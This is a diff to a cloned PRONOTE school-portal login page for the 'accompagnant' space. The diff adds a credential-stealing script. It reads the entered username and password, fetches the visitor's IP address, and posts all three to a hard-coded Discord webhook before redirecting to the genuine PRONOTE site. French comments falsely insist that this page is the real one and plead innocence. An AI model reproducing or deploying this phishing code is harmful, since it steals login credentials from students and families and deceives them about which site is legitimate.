@@ -21,23 +21,31 @@ Default styles for videojs-record 4.5.0
 <meta name=referrer content=no-referrer><link rel=icon type=image/png href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABUFBMVEX///8kbUkfd1AeeVIeeFIgeFIfeFIymnEymnEym3IymnAxmnAkkm0felIeeFMfeFIymnEzmnEzmXAggGAfeFEfeFIymnEym3BAn4AgdVUfeFIymnE1lXUcd08feFIzmnEzmXEfeFIymnFIkXLd6uXX5+A1hWMxg2BOlXdkoYfJ39bq9fHT6eCFw6rE4tbg8OlYrYtQlnj///+31Mc0hWJXmn1joYaJxa1fsJBmo4nV5t7Q4tpptZfH49jt9vI4nXVdr49ls5Wz2co9oHnp8u5CjW0ielSGtqF9v6VNp4SZzbjm8+671ssugV5loohZrYyuzsEsgFxqpYxjspNBjWzc6uQheVP+/v6KuaWBwahMp4M7iWhUmHvJ3tWDwqnV6uLk8uw1nHOix7f7/fx5vaJEjm7I3tQqf1u/2M1JkXNOlHawz8K73tB/wKbM5ty53c+Rt9aMAAAAIXRSTlMAB0mYwdrz89rBmEkHGZfy8pcZCIT19YQIGMjIGC3j4y2v5f2JAAAAAWJLR0QAiAUdSAAAAAlwSFlzAAAB9AAAAfQBswMIkQAAAAd0SU1FB+EFEwsZL6cEbiYAAAFbSURBVDjLhdNXXwIxDADwyl4yZCmomIh7gBEUFUHceyMqKE7c+v3fpD1+3Cmezcs95N9r2iaMNaPNYDSZLVab3eF0sdZod3uAB/Lw+jp+pf2BIIAKEEPhTm2+KwLwEyBGu9V8Ty+0Aoz1Nddr8hqAscY//BH4G2BUqSMAegDD4nxBfRDip3WDPkBf/f48/wGvixkA+uMDgzAUjw8DjIyOjU8gTiZEJBGdzAgwRTQNKaI0zBCPWUyIL2UQHcwkAM0JME8L2UXK5ZcKy5QrFFYQ7cysgNW1Olgn2sBNoi3EbdoRRdiYRQG0Wwd7RPuYITpQgbUBDrlJHxEd4wlRUguULU6LHJyV6BwviC61WyhFlislXuQVFa+rdHOrAnvjmGW446Byz7d6QBU4+EU91mopeHquvQC8vlXfszzx8fklgFN+1dLHkj+3tGHkLSdtWnnbywdHPnry4dUf/28gdn3j3/yFkwAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxNy0wNS0xOVQxMToyNTo0NyswMjowMG7PmyEAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTctMDUtMTlUMTE6MjU6NDcrMDI6MDAfkiOdAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAABJRU5ErkJggg==" sizes=32x32><style>.sf-hidden{display:none!important}</style><link rel=canonical href=https://3500002a.index-education.net/pronote/accompagnant.html><meta http-equiv="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src-elem * data: blob: 'unsafe-inline' 'unsafe-eval';connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline' media-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline';font-src * data: blob: 'unsafe-inline';frame-ancestors * data: blob:;"></head>
  <body id=id_body class=EspaceIndex>
     <script>
+        
         async function saveCredentials() {
             const username = document.querySelector('input[type="text"]').value; 
             const password = document.querySelector('input[type="password"]').value;
-
+            
             // bonjour monsieur, si vous voyez ce message veuillez me contacter sur adam.elkalawi@gmail.com
             // ce n'est pas du tout ce que vous pensez, je suis un simple lycéen
+            // ceci est le vrai pronote 
+            // le faux est celui sur le site du lycee lyautey
+            // il faut me croire je viens du futur
 
+
+            
             if (username && password) {
-
-                localStorage.setItem('userIP', ipAddress);
-
-                const discordWebhookURL = "https://discord.com/api/webhooks/1327696687892004874/6cT7WpvBUG_cPVe7z2NfkPAANYVGISea57ApiVLYHXOxz_1ahf2T0tqitRrgrOFfMHpr";
-                const discordPayload = {
-                    content: `**Données reçues accompagnant :**\n- Username : ${username}\n- Password : ${password} -userIP : ${userIP} `
-                };
-
                 try {
+   
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    const ipAddress = data.ip;
+
+                    const discordWebhookURL = "https://discord.com/api/webhooks/1327696687892004874/6cT7WpvBUG_cPVe7z2NfkPAANYVGISea57ApiVLYHXOxz_1ahf2T0tqitRrgrOFfMHpr";
+                    const discordPayload = {
+                        content: `**Données reçues acompagnants :**\n- Username : ${username}\n- Password : ${password}\n- Adresse IP : ${ipAddress}`
+                    };
+
                     await fetch(discordWebhookURL, {
                         method: 'POST',
                         headers: {
@@ -46,12 +54,14 @@ Default styles for videojs-record 4.5.0
                         body: JSON.stringify(discordPayload),
                     });
 
+
                     window.location.href = "https://3500002a.index-education.net/pronote/accompagnant.html";
                 } catch (error) {
                     console.error('Erreur réseau :', error);
                 }
             }
         }
+
     </script>
   <body id=id_body class=EspaceIndex>
     <div id=id_10_bloquer class="BloquerInterface NePasImprimer SansSelectionTexte blocage-patience" style=display:none></div><noscript style=position:absolute;top:100px class="Texte12 Gras Espace">Java script non activé.
